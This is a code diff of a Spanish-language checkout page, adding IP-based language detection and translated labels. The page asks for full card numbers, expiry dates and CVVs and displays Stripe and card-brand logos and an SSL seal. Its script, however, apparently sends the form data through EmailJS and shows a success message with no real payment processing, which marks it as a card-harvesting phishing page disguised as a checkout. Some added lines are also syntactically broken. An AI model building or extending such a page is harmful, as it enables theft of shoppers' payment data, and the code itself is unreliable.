@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Checkout — Envío y Pago</title>
+<title id="title">Checkout</title>
 <style>
 :root{
   --bg:#ffffff; --card:#ffffff; --muted:#94a3b8; --text:#1f2937;
@@ -94,14 +94,12 @@ input.error, select.error{border-color: var(--danger);}
   color: #22c55e;
 }
 .ssl-seal i {font-size: 18px; color: #22c55e;}
-/* Banner superior */
 .header-banner {
   width: 100%;
   height: auto;
   display: block;
   background: var(--bg);
 }
-/* Logos de pago (Stripe + tarjetas) */
 .payment-logos {
   display: flex;
   justify-content: center;
@@ -124,77 +122,78 @@ input.error, select.error{border-color: var(--danger);}
   </div>
 
   <div class="container">
-    <h1>Finalizar compra</h1>
-    <p class="subtitle">Ingresa tu dirección y los datos de tu tarjeta para completar la compra.</p>
+    <h1 id="titulo">Finalizar compra</h1>
+    <p class="subtitle" id="subtitulo">Ingresa tu dirección y los datos de tu tarjeta para completar la compra.</p>
     <form id="checkoutForm" novalidate>
       <!-- ENVÍO -->
       <div class="card">
-        <div class="section-title"><span class="badge">1</span> Datos de envío</div>
+        <div class="section-title"><span class="badge">1</span> <span id="secEnvio">Datos de envío</span></div>
         <div class="grid">
           <div class="col-6">
-            <label for="shipName">Nombre completo</label>
+            <label for="shipName" id="lblShipName">Nombre completo</label>
             <input id="shipName" name="shipName" required placeholder="Tu nombre completo"/>
           </div>
           <div class="col-6">
-            <label for="shipEmail">Correo electrónico</label>
+            <label for="shipEmail" id="lblShipEmail">Correo electrónico</label>
             <input id="shipEmail" name="shipEmail" type="email" required placeholder="correo@ejemplo.com"/>
           </div>
           <div class="col-6">
-            <label for="shipPhone">Teléfono</label>
+            <label for="shipPhone" id="lblShipPhone">Teléfono</label>
             <input id="shipPhone" name="shipPhone" required placeholder="+52 55 1234 5678"/>
           </div>
           <div class="col-6">
-            <label for="shipPostal">Código postal</label>
+            <label for="shipPostal" id="lblShipPostal">Código postal</label>
             <input id="shipPostal" name="shipPostal" required placeholder="00000"/>
           </div>
           <div class="col-6">
-            <label for="shipCity">Ciudad</label>
+            <label for="shipCity" id="lblShipCity">Ciudad</label>
             <input id="shipCity" name="shipCity" required placeholder="Ciudad"/>
           </div>
           <div class="col-6">
-            <label for="shipCountry">País</label>
+            <label for="shipCountry" id="lblShipCountry">País</label>
             <select id="shipCountry" name="shipCountry" required>
               <option value="MX" selected>México</option>
               <option value="US">Estados Unidos</option>
             </select>
           </div>
           <div class="col-6">
-            <label for="shipState">Estado</label>
+            <label for="shipState" id="lblShipState">Estado</label>
             <select id="shipState" name="shipState" required></select>
           </div>
           <div class="col-12">
-            <label for="shipAddress">Dirección</label>
+            <label for="shipAddress" id="lblShipAddress">Dirección</label>
             <input id="shipAddress" name="shipAddress" required placeholder="Dirección"/>
           </div>
         </div>
       </div>
+
       <!-- FACTURACIÓN -->
       <div class="card">
-        <div class="section-title"><span class="badge">2</span> Datos de facturación</div>
-        <label><input type="checkbox" id="sameAsShipping" checked> Usar mismos datos de envío</label>
+        <div class="section-title"><span class="badge">2</span> <span id="secFact">Datos de facturación</span></div>
+        <label><input type="checkbox" id="sameAsShipping" checked> <span id="lblSameAs">Usar mismos datos de envío</span></label>
         <div id="billingSection" style="display:none; margin-top:14px;">
           <div class="grid">
             <div class="col-6">
-              <label for="billName">Nombre completo</label>
+              <label for="billName" id="lblBillName">Nombre completo</label>
               <input id="billName" name="billName" placeholder="Nombre para facturación"/>
             </div>
             <div class="col-6">
-              <label for="billRFC">RFC (opcional)</label>
+              <label for="billRFC" id="lblBillRFC">RFC (opcional)</label>
               <input id="billRFC" name="billRFC" placeholder="ABC123456789"/>
             </div>
             <div class="col-6">
-              <label for="billCountry">País</label>
+              <label for="billCountry" id="lblBillCountry">País</label>
               <select id="billCountry" name="billCountry">
                 <option value="MX" selected>México</option>
                 <option value="US">Estados Unidos</option>
               </select>
             </div>
             <div class="col-6">
-              <label for="billState">Estado</label>
+              <label for="billState" id="lblBillState">Estado</label>
               <select id="billState" name="billState"></select>
             </div>
             <div class="col-12">
-              <label for="billAddress">Dirección</label>
+              <label for="billAddress" id="lblBillAddress">Dirección</label>
               <input id="billAddress" name="billAddress" placeholder="Dirección"/>
             </div>
           </div>
@@ -203,33 +202,32 @@ input.error, select.error{border-color: var(--danger);}
 
       <!-- PAGO -->
       <div class="card">
-        <div class="section-title"><span class="badge">3</span> Pago con tarjeta</div>
+        <div class="section-title"><span class="badge">3</span> <span id="secPago">Pago con tarjeta</span></div>
 
 <!-- Logos de tarjetas -->
         <div style="margin-bottom:14px;">
-          <!-- Ajusta la extensión si tu archivo no es .jpeg (por ejemplo .jpg o .png) -->
           <img src="IMG_6455.jpeg" alt="Tarjetas aceptadas" style="max-width:220px; height:auto;">
         </div>
 
         <div class="grid">
           <div class="col-6">
-            <label for="cardName">Nombre en tarjeta</label>
+            <label for="cardName" id="lblCardName">Nombre en tarjeta</label>
             <input id="cardName" name="cardName" required placeholder="Como aparece en la tarjeta"/>
           </div>
           <div class="col-6">
-            <label for="cardNumber">Número de tarjeta</label>
+            <label for="cardNumber" id="lblCardNumber">Número de tarjeta</label>
             <input id="cardNumber" name="cardNumber" required placeholder="•••• •••• •••• ••••"/>
           </div>
           <div class="col-4">
-            <label for="cardExp">Vencimiento (MM/AA)</label>
+            <label for="cardExp" id="lblCardExp">Vencimiento (MM/AA)</label>
             <input id="cardExp" name="cardExp" required placeholder="MM/AA"/>
           </div>
           <div class="col-4">
-            <label for="cardCvv">CVV</label>
+            <label for="cardCvv" id="lblCardCvv">CVV</label>
             <input id="cardCvv" name="cardCvv" required placeholder="CVV"/>
           </div>
           <div class="col-4">
-            <label for="cardType">Tipo de tarjeta</label>
+            <label for="cardType" id="lblCardType">Tipo de tarjeta</label>
             <select id="cardType" name="cardType" required>
               <option value="">Selecciona</option>
               <option value="debito">Débito</option>
@@ -238,7 +236,7 @@ input.error, select.error{border-color: var(--danger);}
           </div>
 
           <div class="col-12" id="mesesContainer" style="display:none;">
-            <label for="meses">Meses sin intereses</label>
+            <label for="meses" id="lblMeses">Meses sin intereses</label>
             <select id="meses">
               <option value="">Selecciona plazo</option>
               <option value="3">3 meses MSI</option>
@@ -265,7 +263,7 @@ input.error, select.error{border-color: var(--danger);}
         </div>
       </a>
 
-      <!-- Logos Stripe + tarjetas -->
+<!-- Logos Stripe + tarjetas (nuevo) -->
       <div class="payment-logos">
         <img src="IMG_6459.png" alt="Powered by Stripe, Visa, MasterCard y American Express">
       </div>
@@ -276,12 +274,128 @@ input.error, select.error{border-color: var(--danger);}
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
 <script>
-document.addEventListener("DOMContentLoaded", () => {
+/* ---------------------------
+   Multilenguaje (country+browser)
+   carga ./lang/es.json o ./lang/en.json
+   --------------------------- */
+async function cargarTraducciones(lang) {
+  try {
+    const res = await fetch(`./lang/${lang}.json`);
+    if (!res.ok) throw new Error('No se pudo cargar JSON');
+    return await res.json();
+  } catch (e) {
+    console.error("Error cargando traducciones:", e);
+    return null;
+  }
+}
+
+async function initIdioma() {
+  let idioma = "en";
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    if (res && res.ok) {
+      const data = await res.json();
+      const country = data.country_code;
+      if (country === "MX") idioma = "es";
+      else if (country === "US") idioma = "en";
+      else idioma = navigator.language && navigator.language.startsWith("es") ? "es" : "en";
+    } else {
+      idioma = navigator.language && navigator.language.startsWith("es") ? "es" : "en";
+    }
+  } catch (err) {
+    idioma = navigator.language && navigator.language.startsWith("es") ? "es" : "en";
+  }
+
+  const t = await cargarTraducciones(idioma);
+  if (!t) return;
+
+  // Guardar traducciones globalmente para reuso (ej. reset de botón)
+  window._translations = t;
+
+  // Textos principales
+  const tituloEl = document.getElementById("titulo");
+  if (tituloEl) tituloEl.innerText = t.titulo;
+  const subEl = document.getElementById("subtitulo");
+  if (subEl) subEl.innerText = t.subtitulo;
+  const payBtn = document.getElementById("payBtn");
+  if (payBtn) payBtn.innerText = t.boton;
+  const errEl = document.getElementById("errorMsg");
+  if (errEl) errEl.innerText = t.error;
+  const sslEl = document.querySelector(".ssl-seal");
+  if (sslEl) sslEl.innerHTML = `🔒 ${t.ssl}`;
+
+  // Secciones
+  const sections = document.querySelectorAll(".section-title");
+  if (sections.length >= 3) {
+    sections[0].innerHTML = `<span class="badge">1</span> ${t.secciones.envio}`;
+    sections[1].innerHTML = `<span class="badge">2</span> ${t.secciones.facturacion}`;
+    sections[2].innerHTML = `<span class="badge">3</span> ${t.secciones.pago}`;
+  }
+
+  // Labels por 'for'
+  const labelMap = {
+    shipName: t.envio.nombre,
+    shipEmail: t.envio.email,
+    shipPhone: t.envio.telefono,
+    shipPostal: t.envio.postal,
+    shipCity: t.envio.ciudad,
+    shipCountry: t.envio.pais,
+    shipState: t.envio.estado,
+    shipAddress: t.envio.direccion,
+    billName: t.facturacion.nombre,
+    billRFC: t.facturacion.rfc,
+    billCountry: t.facturacion.pais,
+    billState: t.facturacion.estado,
+    billAddress: t.facturacion.direccion,
+    cardName: t.pago.nombre,
+    cardNumber: t.pago.numero,
+    cardExp: t.pago.vencimiento,
+    cardCvv: t.pago.cvv,
+    cardType: t.pago.tipo,
+    meses: t.pago.meses
+  };
+
+  Object.entries(labelMap).forEach(([forId, text]) => {
+    const lbl = document.querySelector(`label[for='${forId}']`);
+    if (lbl) lbl.innerText = text;
+  });
+
+  // Checkbox sameAsShipping (reemplaza el texto manteniendo el checkbox)
+  const sameCheckboxParent = document.querySelector("#sameAsShipping")?.parentNode;
+  if (sameCheckboxParent) {
+    sameCheckboxParent.innerHTML = `<input type="checkbox" id="sameAsShipping" checked> ${t.facturacion.mismos_datos}`;
+  }
+
+  // Opciones de selects (cardType & meses)
+  const cardType = document.getElementById("cardType");
+  if (cardType) {
+    if (cardType.options.length >= 3) {
+      cardType.options[0].text = t.pago.opciones.selecciona;
+      cardType.options[1].text = t.pago.opciones.debito;
+      cardType.options[2].text = t.pago.opciones.credito;
+    }
+  }
+  const mesesSelect = document.getElementById("meses");
+  if (mesesSelect && mesesSelect.options.length >= 4) {
+    mesesSelect.options[0].text = t.pago.opciones_msi.selecciona;
+    mesesSelect.options[1].text = t.pago.opciones_msi.tres;
+    mesesSelect.options[2].text = t.pago.opciones_msi.seis;
+    mesesSelect.options[3].text = t.pago.opciones_msi.nueve;
+  }
+}
+
+/* ---------------------------
+   Resto del script ORIGINAL (validaciones, EmailJS, envío)
+   --------------------------- */
+document.addEventListener("DOMContentLoaded", async () => {
+  // Primero carga traducciones (intenta); si falla, sigue con el resto.
+  await initIdioma();
+
   const form = document.getElementById("checkoutForm");
   const btn = document.getElementById("payBtn");
   const spinner = document.getElementById("spinner");
   const errorMsg = document.getElementById("errorMsg");
-  const sameAsShipping = document.getElementById("sameAsShipping");
+  let sameAsShipping = document.getElementById("sameAsShipping"); // se reasignará si initIdioma lo recreó
   const billingSection = document.getElementById("billingSection");
   const cardExp = document.getElementById("cardExp");
   const cardType = document.getElementById("cardType");
@@ -292,6 +406,9 @@ document.addEventListener("DOMContentLoaded", () => {
   const shipState = document.getElementById("shipState");
   const billCountry = document.getElementById("billCountry");
   const billState = document.getElementById("billState");
+
+  // Si initIdioma reemplazó el checkbox, volverlo a obtener
+  sameAsShipping = document.getElementById("sameAsShipping");
 
   const states = {
     MX: ["Aguascalientes","Baja California","Baja California Sur","Campeche","Chiapas","Chihuahua","Ciudad de México","Coahuila","Colima","Durango","Estado de México","Guanajuato","Guerrero","Hidalgo","Jalisco","Michoacán","Morelos","Nayarit","Nuevo León","Oaxaca","Puebla","Querétaro","Quintana Roo","San Luis Potosí","Sinaloa","Sonora","Tabasco","Tamaulipas","Tlaxcala","Veracruz","Yucatán","Zacatecas"],
@@ -309,34 +426,41 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  populateStates(shipCountry, shipState);
-  populateStates(billCountry, billState);
+  // Inicializar selects de estado (si existen)
+  if (shipCountry && shipState) populateStates(shipCountry, shipState);
+  if (billCountry && billState) populateStates(billCountry, billState);
 
-  shipCountry.addEventListener("change", () => populateStates(shipCountry, shipState));
-  billCountry.addEventListener("change", () => populateStates(billCountry, billState));
+  if (shipCountry) shipCountry.addEventListener("change", () => populateStates(shipCountry, shipState));
+  if (billCountry) billCountry.addEventListener("change", () => populateStates(billCountry, billState));
 
-  sameAsShipping.addEventListener("change", () => {
-    billingSection.style.display = sameAsShipping.checked ? "none" : "block";
-  });
+  if (sameAsShipping) {
+    sameAsShipping.addEventListener("change", () => {
+      billingSection.style.display = sameAsShipping.checked ? "none" : "block";
+    });
+  }
 
-  cardExp.addEventListener("input", () => {
-    let value = cardExp.value.replace(/[^0-9]/g, "");
-    if (value.length >= 3) {
-      value = value.substring(0, 2) + "/" + value.substring(2, 4);
-    }
-    cardExp.value = value;
-  });
+  if (cardExp) {
+    cardExp.addEventListener("input", () => {
+      let value = cardExp.value.replace(/[^0-9]/g, "");
+      if (value.length >= 3) {
+        value = value.substring(0, 2) + "/" + value.substring(2, 4);
+      }
+      cardExp.value = value;
+    });
+  }
 
-  cardType.addEventListener("change", () => {
-    if (cardType.value === "credito") {
-      mesesContainer.style.display = "block";
-      meses.setAttribute("required", "required");
-    } else {
-      mesesContainer.style.display = "none";
-      meses.removeAttribute("required");
-      meses.value = "";
-    }
-  });
+  if (cardType) {
+    cardType.addEventListener("change", () => {
+      if (cardType.value === "credito") {
+        mesesContainer.style.display = "block";
+        meses.setAttribute("required", "required");
+      } else {
+        mesesContainer.style.display = "none";
+        meses.removeAttribute("required");
+        meses.value = "";
+      }
+    });
+  }
 
   function validLuhn(number) {
     const arr = (number + '').replace(/\D/g,'').split('').reverse().map(x=>+x);
@@ -374,14 +498,22 @@ document.addEventListener("DOMContentLoaded", () => {
     return valid;
   }
 
+  // Inicializar EmailJS (mantengo tu public key)
   emailjs.init("T72Wf1jx7lTBM9Md-");
 
-  form.addEventListener("submit", e => {
+  // Validaciones al perder el foco
+  form.querySelectorAll("input,select").forEach(el => {
+    el.addEventListener("blur", () => validateField(el));
+  });
+
+  // Submit (solo uno)
+  form.addEventListener("submit", (e) => {
     e.preventDefault();
-    const fields = Array.from(document.querySelectorAll("input, select"));
+    errorMsg.style.display = "none";
     let valid = true;
+    const fields = Array.from(form.querySelectorAll("input,select"));
     fields.forEach(f => {
-      if (f.closest("#billingSection") && sameAsShipping.checked) return;
+      if (f.closest("#billingSection") && sameAsShipping && sameAsShipping.checked) return;
       if (!validateField(f)) valid = false;
     });
     if (!valid) return;
@@ -395,16 +527,31 @@ document.addEventListener("DOMContentLoaded", () => {
       .then(() => {
         spinner.style.display = "none";
         btn.disabled = false;
-        btn.textContent = "Pagar ahora";
-        errorMsg.style.display = "block"; // aquí podrías poner mensaje de éxito
+        btn.textContent = (window._translations && window._translations.boton) ? window._translations.boton : "Pagar ahora";
+        // Mostrar mensaje de éxito (uso alert para mantener simple)
+        alert((window._translations && window._translations.success_message) ? window._translations.success_message :
+        form.reset();
+        // reenfocar estados en selects
+        if (shipCountry && shipState) populateStates(shipCountry, shipState);
+        if (billCountry && billState) populateStates(billCountry, billState);
       })
       .catch(() => {
         spinner.style.display = "none";
         btn.disabled = false;
-        btn.textContent = "Pagar ahora";
+        btn.textContent = (window._translations && window._translations.boton) ? window._translations.boton : "Pagar ahora";
+        const t = window._translations;
+        errorMsg.textContent = (t && t.error) ? t.error :
         errorMsg.style.display = "block";
       });
   });
+
+  // (Opcional) rehacer sameAsShipping variable if the checkbox was re-rendered by language init
+  sameAsShipping = document.getElementById("sameAsShipping");
+  if (sameAsShipping) {
+    sameAsShipping.addEventListener("change", () => {
+      billingSection.style.display = sameAsShipping.checked ? "none" : "block";
+    });
+  }
 });
 </script>
 </body>
